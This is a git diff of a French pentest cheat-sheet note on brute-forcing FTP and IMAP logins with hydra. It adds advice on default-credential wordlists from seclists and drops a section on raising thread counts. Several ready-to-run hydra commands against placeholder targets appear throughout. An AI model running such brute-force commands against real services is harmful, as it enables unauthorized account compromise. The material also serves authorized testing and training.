@@ -1,6 +1,12 @@
 ---
 public: true # set to true to make the article publishable
 ---
+## Sans connaitre un identifiant ou mot de passe
+
+Selon le service à attaquer, on pourra utiliser hydra avec le paramètre `-C` et fournir un dictionnaire (wordlist) contenant des couples `utilisateur:mot_de_passe` séparés par `:`
+Plusieures wordlist de ce type sont disponibles dans `/usr/share/seclists/Passwords/Default-Credentials/` (notamment `ftp-betterdefaultpasslist.txt`)
+
+
 ```
 hydra -l user -P passlist.txt ftp://192.168.0.1
 hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN
@@ -17,11 +23,3 @@ hydra -l 'rebrec@domain.com' -P password.list  $TARGET_IP imap -t 64
 
 ```
 Plus d'exemple d'utilisation de l'outil : [[Hydra]]
-## Augmenter la rapidité de l'attaque
-
-On peut utiliser `-t 64` pour augmenter le nombre de threads
-
-```
-hydra -l sam -P mut_password.list ftp://$TARGET_IP -t 64 
-```
-
